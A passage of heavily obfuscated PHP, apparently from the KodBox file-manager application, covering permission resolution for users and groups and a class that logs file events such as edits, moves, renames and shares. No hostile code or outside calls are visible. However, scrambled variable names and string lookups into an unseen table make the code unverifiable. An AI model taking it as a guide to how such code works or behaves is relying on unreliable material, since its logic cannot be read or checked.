$_SERVER[ÓïÕü]; if (!$Ñ‘©á·£ && KodUser::isRoot()) { return !0; } $—Â…ÄğÎ = Model($ƒ±ºÍÊë[602])->getInfo($Ñ‘©á·£); $Ş„áÁÛÌ = Model($ƒ±ºÍÊë[2213])->listData($—Â…ÄğÎ[$ƒ±ºÍÊë[2214]]); if ($Ş„áÁÛÌ && $Ş„áÁÛÌ[$ƒ±ºÍÊë[580]][$ƒ±ºÍÊë[2215]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¼ÍˆĞİ¹) { $¿³—Ú =& $_SERVER[ÓïÕü]; $°§öÉ˜€ = Model($¿³—Ú[1456]); $Ÿ”²ì¼ = $°§öÉ˜€->sourceInfo($¼ÍˆĞİ¹); if (!$Ÿ”²ì¼) { return !1; } $°§öÉ˜€->groupPathDisplay($Ÿ”²ì¼); $ªÂÊä‹ = array($Ÿ”²ì¼); $ªÂÊä‹ = $°§öÉ˜€->_listAppendPath($ªÂÊä‹); $Ÿ”²ì¼ = $ªÂÊä‹[0]; $Èò×Í° = $Ÿ”²ì¼[$¿³—Ú[587]]; if (isset($Ÿ”²ì¼[$¿³—Ú[595]])) { $¶Æ½ûë× = explode($¿³—Ú[8], trim($Ÿ”²ì¼[$¿³—Ú[587]], $¿³—Ú[8])); array_shift($¶Æ½ûë×); $Èò×Í° = $Ÿ”²ì¼[$¿³—Ú[593]] . $¿³—Ú[2216] . implode($¿³—Ú[8], $¶Æ½ûë×); } return array($¿³—Ú[497] => $Ÿ”²ì¼[$¿³—Ú[32]], $¿³—Ú[87] => KodIO::make($Ÿ”²ì¼[$¿³—Ú[194]]), $¿³—Ú[2217] => $Èò×Í°); } private function groupAuthInfo($²Şıı›”, $„øğËÜ¡) { $¦Ê‡ù†ô =& $_SERVER[ÓïÕü]; $–óæš¡¯ = Model($¦Ê‡ù†ô[590])->getInfo($„øğËÜ¡); return array($¦Ê‡ù†ô[2218] => intval($²Şıı›”[$¦Ê‡ù†ô[490]]), $¦Ê‡ù†ô[2201] => $²Şıı›”, $¦Ê‡ù†ô[2219] => LNG($¦Ê‡ù†ô[2220]), $¦Ê‡ù†ô[2210] => array($¦Ê‡ù†ô[497] => $–óæš¡¯[$¦Ê‡ù†ô[32]], $¦Ê‡ù†ô[87] => KodIO::make($–óæš¡¯[$¦Ê‡ù†ô[90]][$¦Ê‡ù†ô[194]]), $¦Ê‡ù†ô[2217] => $–óæš¡¯[$¦Ê‡ù†ô[594]])); } protected function groupRootAuth($ÜéÑ‚µ‘, $Í›µŸÃ‚ = false) { $ü‹·‰ ¼ =& $_SERVER[ÓïÕü]; $Í›µŸÃ‚ = $Í›µŸÃ‚ ? $Í›µŸÃ‚ : USER_ID; $ÏËÄ‹·Œ = $Í›µŸÃ‚ . $ü‹·‰ ¼[2221] . $ÜéÑ‚µ‘; static $·­öË¹Å = array(); if (isset($·­öË¹Å[$ÏËÄ‹·Œ])) { return $·­öË¹Å[$ÏËÄ‹·Œ]; } $„ û›û = Model($ü‹·‰ ¼[590])->getInfo($ÜéÑ‚µ‘); $ã¥Ú½°ğ = $this->userGroupList($Í›µŸÃ‚); $õ™Û»ğø = isset($ã¥Ú½°ğ[$ÜéÑ‚µ‘]) ? $ã¥Ú½°ğ[$ÜéÑ‚µ‘][$ü‹·‰ ¼[490]] : !1; if ($õ™Û»ğø && Model($ü‹·‰ ¼[576])->authCheckAction($õ™Û»ğø[$ü‹·‰ ¼[490]], $ü‹·‰ ¼[2027])) { $·­öË¹Å[$ÏËÄ‹·Œ] = $õ™Û»ğø; return $õ™Û»ğø; } $ŒÂÇñØÂ = $this->sourceAuthSelect($„ û›û[$ü‹·‰ ¼[90]][$ü‹·‰ ¼[194]]); $½ÈÍõ¥ä = $ŒÂÇñØÂ ? $this->authMake($ŒÂÇñØÂ, $Í›µŸÃ‚) : !1; $–³‡§÷ˆ = $½ÈÍõ¥ä ? $½ÈÍõ¥ä[$ü‹·‰ ¼[545]] : !1; $·­öË¹Å[$ÏËÄ‹·Œ] = $–³‡§÷ˆ ? $–³‡§÷ˆ : $õ™Û»ğø; return $·­öË¹Å[$ÏËÄ‹·Œ]; } public function authOwnerApply($˜çäßüû) { $¼¹á¬ß® =& $_SERVER[ÓïÕü]; if (empty($˜çäßüû[$¼¹á¬ß®[490]]) || isset($˜çäßüû[$¼¹á¬ß®[2222]]) && $˜çäßüû[$¼¹á¬ß®[2222]]) { return $˜çäßüû; } if (AuthModel::authCheckRoot($˜çäßüû[$¼¹á¬ß®[490]][$¼¹á¬ß®[491]])) { return $˜çäßüû; } $ß§ «ó = Model($¼¹á¬ß®[1456])->parentLevelArray($˜çäßüû[$¼¹á¬ß®[589]]); $ß§ «ó = array_merge(array($˜çäßüû[$¼¹á¬ß®[194]]), array_reverse($ß§ «ó)); $‘ˆ«Ğ÷œ = $this->sourceAuthSelect($ß§ «ó); $½Æœè™“ = array(); $‚ö»æ¹ = array(); foreach ($‘ˆ«Ğ÷œ as $ùÔ“Ï¸€ => $è³Ï½‹æ) { $³‰ÑÖ‡ = $this->authFolderOwnerUser($è³Ï½‹æ); $½Æœè™“[$ùÔ“Ï¸€] = $³‰ÑÖ‡; $‚ö»æ¹ = array_merge($‚ö»æ¹, $³‰ÑÖ‡[$¼¹á¬ß®[670]]); if ($³‰ÑÖ‡[$¼¹á¬ß®[2223]]) { break; } } if (count($‚ö»æ¹) == 0) { $‚ö»æ¹ = $this->authFolderOwnerGroup($˜çäßüû[$¼¹á¬ß®[574]]); } $‚ö»æ¹ = array_unique($‚ö»æ¹); if (AuthModel::authCheckRoot($˜çäßüû[$¼¹á¬ß®[490]][$¼¹á¬ß®[491]])) { $‚ö»æ¹[] = USER_ID; } $˜çäßüû[$¼¹á¬ß®[490]][$¼¹á¬ß®[2224]] = Model($¼¹á¬ß®[582])->userListInfo($‚ö»æ¹); return $˜çäßüû; } private function authFolderOwnerGroup($·ïİÃ«) { $÷†ºÄ¹´ =& $_SERVER[ÓïÕü]; $øƒóŒ¿„ = Model($÷†ºÄ¹´[2101])->where(array($÷†ºÄ¹´[1418] => $·ïİÃ«))->select(); $ê÷ö³˜‘ = array(); if (!$øƒóŒ¿„) { return $ê÷ö³˜‘; } foreach ($øƒóŒ¿„ as $Íï„º) { $£ŞÉúµÊ = $this->authInfo($Íï„º); if (AuthModel::authCheckRoot($£ŞÉúµÊ[$÷†ºÄ¹´[490]])) { $ê÷ö³˜‘[] = $Íï„º[$÷†ºÄ¹´[1806]]; } } return $ê÷ö³˜‘; } private function authFolderOwnerUser($Š¯¸Ÿœ) { $üšÎíŞƒ =& $_SERVER[ÓïÕü]; $Š€Œ¡œ = array(); $ªş­×éÍ = !1; foreach ($Š¯¸Ÿœ as $â£ŸÅ©Á) { $·š¡ì‰» = $this->authInfo($â£ŸÅ©Á); if ($â£ŸÅ©Á[$üšÎíŞƒ[574]] == $üšÎíŞƒ[231]) { $ªş­×éÍ = !0; } if ($â£ŸÅ©Á[$üšÎíŞƒ[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($·š¡ì‰»[$üšÎíŞƒ[490]])) { $Š€Œ¡œ[] = $â£ŸÅ©Á[$üšÎíŞƒ[574]]; } } } return array($üšÎíŞƒ[670] => $Š€Œ¡œ, $üšÎíŞƒ[2223] => $ªş­×éÍ); } public function authMake($ãŞ¢¥À, $À¼šşß = false) { $ÜèÎ®‹Œ =& $_SERVER[ÓïÕü]; $©¡¤±ãï = $this->authArrayCheck($ãŞ¢¥À, $À¼šşß); if ($©¡¤±ãï[$ÜèÎ®‹Œ[2225]]) { $©¡¤±ãï[$ÜèÎ®‹Œ[2225]] = $this->sourceAuthInfo($©¡¤±ãï[$ÜèÎ®‹Œ[2225]]); } return $©¡¤±ãï; } public function authArrayCheck($Ô‘ÕÕê—, $¿ÀÓèß” = false) { $¥ª¬Ã•¾ =& $_SERVER[ÓïÕü]; if (!$Ô‘ÕÕê—) { return array($¥ª¬Ã•¾[491] => 0, $¥ª¬Ã•¾[545] => !1); } $¿ÀÓèß” = $¿ÀÓèß” ? $¿ÀÓèß” : USER_ID; $‹õ‘Ò¡Æ = 0; $¡úĞù¼ = 0; $·Øñü³ = 0; $½¨µşè« = 0; $ãáÕÕ³  = 0; $§ê¼¯¨Ú = 0; $Æ”¤ÛÚ = 1000; $ÑûŸßÉ‰ = 0; $Ä²‚„‚ = 0; $ö£æ”ñú = 0; $÷¨şÈ÷ = 0; $Ï†üÌğ = array($¥ª¬Ã•¾[194] => 0); foreach ($Ô‘ÕÕê— as $Ï†üÌğ) { $‹Á•‘Äà = $this->authInfo($Ï†üÌğ); if (!$‹Á•‘Äà) { continue; } $‰†ƒ±˜§ = $Ï†üÌğ[$¥ª¬Ã•¾[574]]; $¨¨Øå°ñ = intval($‹Á•‘Äà[$¥ª¬Ã•¾[490]]); if ($Ï†üÌğ[$¥ª¬Ã•¾[191]] == SourceModel::TYPE_USER && $‰†ƒ±˜§ == $¿ÀÓèß”) { $‹õ‘Ò¡Æ = !0; $·Øñü³ = $‹Á•‘Äà; $¡úĞù¼ = $¨¨Øå°ñ; } else { if ($Ï†üÌğ[$¥ª¬Ã•¾[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‰†ƒ±˜§, $¿ÀÓèß”)) { $½¨µşè« = !0; $¾ÀÃŠ¤Ö = $this->groupStepToUserGroup($‰†ƒ±˜§, $¿ÀÓèß”); if ($¾ÀÃŠ¤Ö < $Æ”¤ÛÚ) { $Æ”¤ÛÚ = $¾ÀÃŠ¤Ö; $ãáÕÕ³  = $¨¨Øå°ñ; $§ê¼¯¨Ú = $‹Á•‘Äà; $ÑûŸßÉ‰ = $‰†ƒ±˜§; } if ($¾ÀÃŠ¤Ö == $Æ”¤ÛÚ && $¨¨Øå°ñ >= $ãáÕÕ³ ) { $ãáÕÕ³  = $¨¨Øå°ñ; $§ê¼¯¨Ú = $‹Á•‘Äà; $ÑûŸßÉ‰ = $‰†ƒ±˜§; } } else { if ($‰†ƒ±˜§ == $¥ª¬Ã•¾[231]) { $Ä²‚„‚ = !0; $÷¨şÈ÷ = $‹Á•‘Äà; $ö£æ”ñú = $¨¨Øå°ñ; } } } } if ($‹õ‘Ò¡Æ) { $’Šû– = $¡úĞù¼; $‹Á•‘Äà = $·Øñü³; $»ÑæŒÄ = LNG($¥ª¬Ã•¾[2226]); } else { if ($½¨µşè«) { $’Šû– = $ãáÕÕ³ ; $‹Á•‘Äà = $§ê¼¯¨Ú; $öéÌ¥³› = Model($¥ª¬Ã•¾[590])->getInfo($ÑûŸßÉ‰); $»ÑæŒÄ = $¥ª¬Ã•¾[176] . $öéÌ¥³›[$¥ª¬Ã•¾[594]] . $¥ª¬Ã•¾[2227] . LNG($¥ª¬Ã•¾[2228]); } else { if ($Ä²‚„‚) { $’Šû– = $ö£æ”ñú; $‹Á•‘Äà = $÷¨şÈ÷; $»ÑæŒÄ = LNG($¥ª¬Ã•¾[2199]); } else { $’Šû– = 0; $‹Á•‘Äà = !1; $»ÑæŒÄ = $¥ª¬Ã•¾[12]; } } } $Ø´µ×¡ì = array($¥ª¬Ã•¾[2218] => intval($’Šû–), $¥ª¬Ã•¾[2201] => $‹Á•‘Äà, $¥ª¬Ã•¾[2219] => $»ÑæŒÄ, $¥ª¬Ã•¾[2210] => $Ï†üÌğ[$¥ª¬Ã•¾[194]]); return $Ø´µ×¡ì; } private function groupContainUser($Ğùƒ“ïÈ, $•ƒê‘µª = false) { return in_array($Ğùƒ“ïÈ, $this->userGroupParents($•ƒê‘µª)); } private function groupStepToUserGroup($¸äÖ‰üŸ, $æºÕ¯¹‹ = false) { $™´èÍğî =& $_SERVER[ÓïÕü]; $˜òÀ¤ = $this->userGroupList($æºÕ¯¹‹); $¢¸úúò = 1000; $¾™ïõÙ  = $GLOBALS[$™´èÍğî[6]][$™´èÍğî[92]][$™´èÍğî[2114]] == 1; $ùúåâå« = $¾™ïõÙ  ? 3 : 2; foreach ($˜òÀ¤ as $ŒŒ§Õ¥) { if ($ŒŒ§Õ¥[$™´èÍğî[1418]] == $¸äÖ‰üŸ) { return 0; } $Â©ñşç = explode($™´èÍğî[50], trim($ŒŒ§Õ¥[$™´èÍğî[589]], $™´èÍğî[50])); if ($Â©ñşç[0] == $™´èÍğî[231] && count($Â©ñşç) > $ùúåâå«) { $º†ò“ = array_reverse(array_slice($Â©ñşç, $ùúåâå«)); $›‚Á“ÔÕ = array_search($¸äÖ‰üŸ, $º†ò“); if ($›‚Á“ÔÕ !== !1 && $›‚Á“ÔÕ + 1 <= $¢¸úúò) { $¢¸úúò = $›‚Á“ÔÕ + 1; } } } return $¢¸úúò; } private function userGroupList($ÂÕ´»Á¬ = false) { $ù¸Àƒî =& $_SERVER[ÓïÕü]; static $›‘´‡õå = array(); if (isset($›‘´‡õå[$ÂÕ´»Á¬])) { return $›‘´‡õå[$ÂÕ´»Á¬]; } $ûŠµ§Îº = Model($ù¸Àƒî[602])->getInfo($ÂÕ´»Á¬); $›‘´‡õå[$ÂÕ´»Á¬] = array_to_keyvalue($ûŠµ§Îº[$ù¸Àƒî[1417]], $ù¸Àƒî[1418]); return $›‘´‡õå[$ÂÕ´»Á¬]; } public function userGroupParents($ğ›Ö¶Îˆ) { $á¢¤ëï² =& $_SERVER[ÓïÕü]; static $±ªÌÌ¹ = array(); $ğ›Ö¶Îˆ = $ğ›Ö¶Îˆ ? $ğ›Ö¶Îˆ : USER_ID; if (isset($±ªÌÌ¹[$ğ›Ö¶Îˆ])) { return $±ªÌÌ¹[$ğ›Ö¶Îˆ]; } $åÆĞÔ¢Î = $this->userGroupList($ğ›Ö¶Îˆ); $ìİÙÅ˜ = array(); $°¥ŒüÇª = $GLOBALS[$á¢¤ëï²[6]][$á¢¤ëï²[92]][$á¢¤ëï²[2114]] == 1; $±Ú®µ˜Õ = $°¥ŒüÇª ? 3 : 2; foreach ($åÆĞÔ¢Î as $îğ§„¦Û) { $–Ìåäôı = array($îğ§„¦Û[$á¢¤ëï²[1418]]); $²­Áâ”ä = explode($á¢¤ëï²[50], trim($îğ§„¦Û[$á¢¤ëï²[589]], $á¢¤ëï²[50])); if ($²­Áâ”ä[0] == $á¢¤ëï²[231] && count($²­Áâ”ä) > $±Ú®µ˜Õ) { $‡Èæ’ó = array_slice($²­Áâ”ä, $±Ú®µ˜Õ); $–Ìåäôı = array_merge($–Ìåäôı, array_reverse($‡Èæ’ó)); } $ìİÙÅ˜ = array_merge($ìİÙÅ˜, $–Ìåäôı); } $±ªÌÌ¹[$ğ›Ö¶Îˆ] = array_unique($ìİÙÅ˜); return $±ªÌÌ¹[$ğ›Ö¶Îˆ]; } public function authTargetInfoMake($‹ÒìÚ°ı) { $¸û›ŞÅ† =& $_SERVER[ÓïÕü]; $ı„ïÚÚ¿ = array(); $‰ôÖçÎÊ = array(); foreach ($‹ÒìÚ°ı as $¢§³÷ö„) { if ($¢§³÷ö„[$¸û›ŞÅ†[191]] == SourceModel::TYPE_USER) { $ı„ïÚÚ¿[] = intval($¢§³÷ö„[$¸û›ŞÅ†[574]]); } else { if ($¢§³÷ö„[$¸û›ŞÅ†[191]] == SourceModel::TYPE_GROUP) { $‰ôÖçÎÊ[] = intval($¢§³÷ö„[$¸û›ŞÅ†[574]]); } } } if ($ı„ïÚÚ¿) { $ı„ïÚÚ¿ = Model($¸û›ŞÅ†[582])->userListInfo($ı„ïÚÚ¿); } if ($‰ôÖçÎÊ) { $ÊŠ¸ñ¦¥ = array($¸û›ŞÅ†[2096] => array($¸û›ŞÅ†[495], $‰ôÖçÎÊ)); $‰ôÖçÎÊ = Model($¸û›ŞÅ†[590])->field($¸û›ŞÅ†[2229])->where($ÊŠ¸ñ¦¥)->select(); $‰ôÖçÎÊ = array_to_keyvalue($‰ôÖçÎÊ, $¸û›ŞÅ†[1418]); } return array($¸û›ŞÅ†[2230] => $ı„ïÚÚ¿, $¸û›ŞÅ†[2231] => $‰ôÖçÎÊ); } public function authInfo($ıÆá°—ä) { $¾…¬¨Ã =& $_SERVER[ÓïÕü]; if ($ıÆá°—ä[$¾…¬¨Ã[2115]]) { $Ê¡Î©Èƒ = Model($¾…¬¨Ã[576])->listData($ıÆá°—ä[$¾…¬¨Ã[2115]]); if (!$Ê¡Î©Èƒ) { return !1; $ñ«¤¤ªÊ = Model($¾…¬¨Ã[576])->listData(); $Ÿıßßï = array_filter_by_field($ñ«¤¤ªÊ, $¾…¬¨Ã[490], $¾…¬¨Ã[231]); return $Ÿıßßï; } $¡È»ı™ñ = array_field_key($Ê¡Î©Èƒ, array($¾…¬¨Ã[478], $¾…¬¨Ã[32], $¾…¬¨Ã[490], $¾…¬¨Ã[2029], $¾…¬¨Ã[2030])); $¡È»ı™ñ[$¾…¬¨Ã[2232]] = $ıÆá°—ä; return $¡È»ı™ñ; } else { return array($¾…¬¨Ã[496] => 0, $¾…¬¨Ã[2012] => $ıÆá°—ä[$¾…¬¨Ã[2178]], $¾…¬¨Ã[497] => $¾…¬¨Ã[12], $¾…¬¨Ã[2029] => $¾…¬¨Ã[2233]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\143\x65\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\x54\151\x6d\x65", "\164\x69\155\145", "\151\x6e\163\x65\162\x74", "\146\165\156\143\164\151\157\x6e"), array("\144\145\163\143", '', "\151\x6e\163\145\162\x74\54\165\160\144\141\164\x65\54\x73\x65\x6c\x65\x63\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($éÕ‘Û…è, $çô—‰¿·, $¬…‰µÉ¬ = '') { $ØãÅ¾ƒŞ =& $_SERVER[ÓïÕü]; if (!$this->eventSave) { return; } $«÷§«¸ = Model($ØãÅ¾ƒŞ[1456])->sourceInfo($éÕ‘Û…è); if (!$«÷§«¸) { return !1; } if ($this->isDisableEvent($«÷§«¸, $çô—‰¿·)) { return; } if ($¬…‰µÉ¬ && is_string($¬…‰µÉ¬)) { $¬…‰µÉ¬ = array($ØãÅ¾ƒŞ[2045] => $¬…‰µÉ¬); } $û¹ë¯ğ = defined($ØãÅ¾ƒŞ[2234]) ? USER_ID : 0; $¾¹¦­°Ë = array($ØãÅ¾ƒŞ[494] => $éÕ‘Û…è, $ØãÅ¾ƒŞ[2235] => $«÷§«¸[$ØãÅ¾ƒŞ[193]], $ØãÅ¾ƒŞ[2236] => $«÷§«¸[$ØãÅ¾ƒŞ[32]], $ØãÅ¾ƒŞ[587] => !empty($«÷§«¸[$ØãÅ¾ƒŞ[587]]) ? $«÷§«¸[$ØãÅ¾ƒŞ[587]] : $ØãÅ¾ƒŞ[12], $ØãÅ¾ƒŞ[1797] => $û¹ë¯ğ, $ØãÅ¾ƒŞ[499] => $çô—‰¿·, $ØãÅ¾ƒŞ[1799] => $¬…‰µÉ¬); $this->addSystemLog($çô—‰¿·, $¾¹¦­°Ë); unset($¾¹¦­°Ë[$ØãÅ¾ƒŞ[2236]], $¾¹¦­°Ë[$ØãÅ¾ƒŞ[587]]); return $this->add($¾¹¦­°Ë); } private function addSystemLog($Î…ëûÄ•, $ãíÌëİ‰) { $ŒøĞŸ¹ =& $_SERVER[ÓïÕü]; if ($Î…ëûÄ• == $ŒøĞŸ¹[2237]) { $Î…ëûÄ• = $ãíÌëİ‰[$ŒøĞŸ¹[529]][$ŒøĞŸ¹[2238]]; } else { if (in_array($Î…ëûÄ•, array($ŒøĞŸ¹[1986], $ŒøĞŸ¹[2239]))) { $Î…ëûÄ• = $ãíÌëİ‰[$ŒøĞŸ¹[529]][$ŒøĞŸ¹[171]]; } } $Á–ëŒ¾Ì = array_merge($ãíÌëİ‰, array($ŒøĞŸ¹[2240] => $ãíÌëİ‰[$ŒøĞŸ¹[194]], $ŒøĞŸ¹[2241] => $ãíÌëİ‰[$ŒøĞŸ¹[2241]])); Hook::trigger($ŒøĞŸ¹[2242], $ŒøĞŸ¹[2243] . $Î…ëûÄ•, $ãíÌëİ‰); Model($ŒøĞŸ¹[1950])->addLog($ŒøĞŸ¹[2243] . $Î…ëûÄ•, $Á–ëŒ¾Ì); } private function isDisableEvent($½„äõ¡ä, $¼—‘µ‹») { $‰¶÷‚´ =& $_SERVER[ÓïÕü]; if ($½„äõ¡ä[$‰¶÷‚´[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($¼—‘µ‹» == $‰¶÷‚´[1975]) { return !1; } return !0; } public function eventCreate($Ù‚‹Ñö, $ÒÀöÅº) { $¿„šùÛõ =& $_SERVER[ÓïÕü]; $È¹·£¡Í = Model($¿„šùÛõ[1456])->sourceInfo($Ù‚‹Ñö); $ÌıÜ‰¾Ğ = array($¿„šùÛõ[2238] => $ÒÀöÅº, $¿„šùÛõ[32] => $È¹·£¡Í[$¿„šùÛõ[32]]); return $this->addEvent($Ù‚‹Ñö, $¿„šùÛõ[2237], $ÌıÜ‰¾Ğ); } public function eventFileEdit($‘ªĞàÇ¤) { $¬­ôºòÕ =& $_SERVER[ÓïÕü]; $Î³íËşÕ = array($¬­ôºòÕ[2244] => $_SERVER[$¬­ôºòÕ[2245]], $¬­ôºòÕ[2246] => strtolower(ACTION)); if (isset($GLOBALS[$¬­ôºòÕ[7]][$¬­ôºòÕ[2247]])) { $Î³íËşÕ[$¬­ôºòÕ[2247]] = $¬­ôºòÕ[91]; } return $this->addEvent($‘ªĞàÇ¤, $¬­ôºòÕ[1976], $Î³íËşÕ); } public function eventRecycle($î¥ñ„Œ, $‹ÈÍ¶ƒÔ) { return $this->addEvent($î¥ñ„Œ, $_SERVER[ÓïÕü][2239], $‹ÈÍ¶ƒÔ); } private static $_removeLast = ''; public function eventRemove($ß•İéè) { $Å‡ÙÉ¯ =& $_SERVER[ÓïÕü]; self::$_removeLast = $ß•İéè; $É¹û´ì = Model($Å‡ÙÉ¯[1456])->sourceInfo($ß•İéè); $Ú÷´¨ã‚ = array_field_key($É¹û´ì, array($Å‡ÙÉ¯[194], $Å‡ÙÉ¯[546], $Å‡ÙÉ¯[508], $Å‡ÙÉ¯[589])); $ŸŸîµé = array($Å‡ÙÉ¯[171] => $É¹û´ì[$Å‡ÙÉ¯[32]], $Å‡ÙÉ¯[2246] => ACTION, $Å‡ÙÉ¯[2248] => $Ú÷´¨ã‚); return $this->addEvent($É¹û´ì[$Å‡ÙÉ¯[193]], $Å‡ÙÉ¯[1975], $ŸŸîµé); } public function eventShare($âÏü‚ş, $Šë ¶áœ) { return $this->addEvent($âÏü‚ş, $_SERVER[ÓïÕü][1986], $Šë ¶áœ); } public function eventMove($ÇÑò…ÑŞ, $¶õ‡Ğ®Õ, $Ñ•ƒ»ª) { $ÏÈì—Áä =& $_SERVER[ÓïÕü]; if (self::$_removeLast == $ÇÑò…ÑŞ) { return; } $ÜæşóÁ = Model($ÏÈì—Áä[1456]); $¿æÊÜ¹µ = $ÜæşóÁ->sourceInfo($ÇÑò…ÑŞ); $ÑÖ‰°ˆ = $ÜæşóÁ->sourceInfo($¶õ‡Ğ®Õ); $¾ÙôäŞ¼ = $ÜæşóÁ->sourceInfo($Ñ•ƒ»ª); $™Ñˆè·‚ = array($ÏÈì—Áä[1268] => $¶õ‡Ğ®Õ, $ÏÈì—Áä[2249] => $ÑÖ‰°ˆ[$ÏÈì—Áä[32]], $ÏÈì—Áä[2225] => !empty($ÑÖ‰°ˆ[$ÏÈì—Áä[587]]) ? $ÑÖ‰°ˆ[$ÏÈì—Áä[587]] : $ÏÈì—Áä[12], $ÏÈì—Áä[1269] => $Ñ•ƒ»ª, $ÏÈì—Áä[2250] => $¾ÙôäŞ¼[$ÏÈì—Áä[32]], $ÏÈì—Áä[2251] => !empty($¾ÙôäŞ¼[$ÏÈì—Áä[587]]) ? $¾ÙôäŞ¼[$ÏÈì—Áä[587]] : $ÏÈì—Áä[12]); $this->addEvent($ÇÑò…ÑŞ, $ÏÈì—Áä[628], $™Ñˆè·‚); $¿æÊÜ¹µ = $ÜæşóÁ->sourceInfo($ÇÑò…ÑŞ); $™Ñˆè·‚ = array($ÏÈì—Áä[194] => $¿æÊÜ¹µ[$ÏÈì—Áä[194]], $ÏÈì—Áä[32] => $¿æÊÜ¹µ[$ÏÈì—Áä[32]]); $this->addEvent($¶õ‡Ğ®Õ, $ÏÈì—Áä[2252], $™Ñˆè·‚); } public function eventCopy($áßÉÛ‰¿) { $this->eventCreate($áßÉÛ‰¿, $_SERVER[ÓïÕü][626]); } public function eventRename($çÆ„½à, $ ¸Ì±°ä, $“ĞÄ‰½) { $ò»õóç” =& $_SERVER[ÓïÕü]; $ãš—Öıù = array($ò»õóç”[1268] => $ ¸Ì±°ä, $ò»õóç”[1269] => $“ĞÄ‰½); return $this->addEvent($çÆ„½à, $ò»õóç”[1470], $ãš—Öıù); } public function eventAddComment($œÃË“Å, $ªæ•Øæ¸) { return $this->addEvent($œÃË“Å, $_SERVER[ÓïÕü][2253], $ªæ•Øæ¸); } public function eventAddDesc($ÎâŠ¿æ¼, $ÑÏ˜¿§) { return $this->addEvent($ÎâŠ¿æ¼, $_SERVER[ÓïÕü][2254], $ÑÏ˜¿§); } public function listBySource($Å«ù¶õ±) { $Àëôªæ£ =& $_SERVER[ÓïÕü]; $µùŸªÍõ = Model($Àëôªæ£[1456])->sourceInfo($Å«ù¶õ±); $ì×®‡¯ = array($Àëôªæ£[494] => $Å«ù¶õ±); if ($µùŸªÍõ[$Àëôªæ£[488]] == $Àëôªæ£[91]) { $¹Ù½ÓœÎ = Model($Àëôªæ£[1456])->listSearchChildren($Å«ù¶õ±, 20000); $¹Ù½ÓœÎ[] = $Å«ù¶õ± . $Àëôªæ£[457]; $ì×®‡¯ = array($Àëôªæ£[194] => array($Àëôªæ£[7], $¹Ù½ÓœÎ)); } $Š¹™º÷Ì = $this->where($ì×®‡¯)->order($Àëôªæ£[2255])->selectPage(); if ($Š¹™º÷Ì[$Àëôªæ£[445]][$Àëôªæ£[446]] == 0) { $Š¹™º÷Ì[$Àëôªæ£[445]][$Àëôªæ£[446]] = 1; $Š¹™º÷Ì[$Àëôªæ£[448]] = array(array($Àëôªæ£[494] => $Å«ù¶õ±, $Àëôªæ£[2235] => $µùŸªÍõ[$Àëôªæ£[193]], $Àëôªæ£[1797] => $µùŸªÍõ[$Àëôªæ£[530]], $Àëôªæ£[499] => $Àëôªæ£[2256], $Àëôªæ£[500] => $µùŸªÍõ[$Àëôªæ£[234]], $Àëôªæ£[1799] => $Àëôªæ£[12])); } return $this->eventListParse($Š¹™º÷Ì, $Å«ù¶õ±); } private function eventListParse($ÕÎÒ‰§Õ, $½ôî¯Ÿƒ) { $³ëä™ÆÉ =& $_SERVER[ÓïÕü]; $˜ıÁİ³õ = $ÕÎÒ‰§Õ[$³ëä™ÆÉ[448]]; $ø«±¶Òú = array_to_keyvalue($˜ıÁİ³õ, $³ëä™ÆÉ[12], $³ëä™ÆÉ[194]); $… ’¤© = array_to_keyvalue($˜ıÁİ³õ, $³ëä™ÆÉ[12], $³ëä™ÆÉ[2241]); foreach ($˜ıÁİ³õ as $ÑĞ§å¼î) { $²Üåşğö = $ÑĞ§å¼î[$³ëä™ÆÉ[529]]; if ($ÑĞ§å¼î[$³ëä™ÆÉ[33]] == $³ëä™ÆÉ[628] && isset($²Üåşğö[$³ëä™ÆÉ[1268]])) { $ø«±¶Òú[] = $²Üåşğö[$³ëä™ÆÉ[1268]] . $³ëä™ÆÉ[12]; $ø«±¶Òú[] = $²Üåşğö[$³ëä™ÆÉ[1269]] . $³ëä™ÆÉ[12]; } if ($ÑĞ§å¼î[$³ëä™ÆÉ[33]] == $³ëä™ÆÉ[2252] && isset($²Üåşğö[$³ëä™ÆÉ[194]])) { $ø«±¶Òú[] = $²Üåşğö[$³ëä™ÆÉ[194]] . $³ëä™ÆÉ[12]; } } $ø«±¶Òú = array_merge($ø«±¶Òú, $… ’¤©, array($½ôî¯Ÿƒ . $³ëä™ÆÉ[12])); $ø«±¶Òú = array_unique($ø«±¶Òú); $™˜™ÜşÌ = array_unique(array_to_keyvalue($˜ıÁİ³õ, $³ëä™ÆÉ[12], $³ëä™ÆÉ[1806])); $‡Ë‹¾ÊÙ = Model($³ëä™ÆÉ[602])->userListInfo($™˜™ÜşÌ); $€ï‰á = Model($³ëä™ÆÉ[921])->sourceListInfo($ø«±¶Òú, !0); foreach ($˜ıÁİ³õ as &$ÑĞ§å¼î) { if ($ÑĞ§å¼î[$³ëä™ÆÉ[33]] == $³ëä™ÆÉ[628] && isset($ÑĞ§å¼î[$³ëä™ÆÉ[529]][$³ëä™ÆÉ[1268]])) { $ÑĞ§å¼î[$³ëä™ÆÉ[529]][$³ëä™ÆÉ[1268]] = $€ï‰á[$ÑĞ§å¼î[$³ëä™ÆÉ[529]][$³ëä™ÆÉ[1268]]]; $ÑĞ§å¼î[$³ëä™ÆÉ[529]][$³ëä™ÆÉ[1269]] = $€ï‰á[$ÑĞ§å¼î[$³ëä™ÆÉ[529]][$³ëä™ÆÉ[1269]]]; } if ($ÑĞ§å¼î[$³ëä™ÆÉ[33]] == $³ëä™ÆÉ[2252] && isset($ÑĞ§å¼î[$³ëä™ÆÉ[529]][$³ëä™ÆÉ[194]])) { $ÑĞ§å¼î[$³ëä™ÆÉ[529]][$³ëä™ÆÉ[194]] = $€ï‰á[$ÑĞ§å¼î[$³ëä™ÆÉ[529]][$³ëä™ÆÉ[194]]]; } $ÑĞ§å¼î[$³ëä™ÆÉ[90]] = $€ï‰á[$ÑĞ§å¼î[$³ëä™ÆÉ[194]]]; $ÑĞ§å¼î[$³ëä™ÆÉ[2257]] = 